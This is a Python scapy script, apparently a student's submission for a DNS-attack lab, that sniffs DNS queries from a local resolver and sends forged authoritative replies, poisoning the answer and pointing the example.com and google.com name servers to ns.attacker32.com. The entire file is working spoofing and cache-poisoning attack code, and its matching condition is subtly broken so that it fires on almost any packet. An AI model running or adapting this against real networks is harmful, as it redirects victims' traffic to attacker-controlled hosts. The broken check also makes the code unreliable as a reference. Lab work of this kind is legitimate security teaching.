#!/usr/bin/env python3

 
#edited by - Soham Shah (HackWeisers)
#student ID - 110036416


from scapy.all import *

print("---------- Starting the Attack ----------- \n")
print("---------- Please go to the user window and type command to dig example.com or google.com ----------- \n")


def spoof_dns(pkt):
  if (DNS in pkt and'www.example.com' or 'www.google.com' in pkt[DNS].qd.qname.decode('utf-8')):
    print("-----------The packet to be send: ------------ \n")

    pkt.show()

    # Swap the source and destination IP address
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    # Swap the source and destination port number
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    # The Answer Section
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='1.1.1.1')
                 
    # The Authority Section
    NSsec1 = DNSRR(rrname='example.com.', type='NS',
                   ttl=259200, rdata='ns.attacker32.com')
    NSsec2 = DNSRR(rrname='google.com.', type='NS',
                   ttl=259200, rdata='ns.attacker32.com')

    # The Additional Section
    Addsec1 = DNSRR(rrname='ns.attacker32.com.', type='A',
                    ttl=259200, rdata='1.2.3.4')
    Addsec2 = DNSRR(rrname='ns.example.com.', type='A',
                    ttl=259200, rdata='5.6.7.8')	
    Addsec3 = DNSRR(rrname='www.google.com.', type='A',
                    ttl=259200, rdata='3.4.5.6')                
	

    # Construct the DNS packet
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=2, arcount=3,
                 an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2/Addsec3)

    # Construct the entire IP packet and send it out
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    print("\n-----------Spoofed packet received from attacker's server: ------------ \n")
    spoofpkt.show()
    
    send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
f = 'udp and src host 10.9.0.53 and dst port 53'
pkt = sniff(iface='br-5b8338aedcce', filter=f, prn=spoof_dns)      
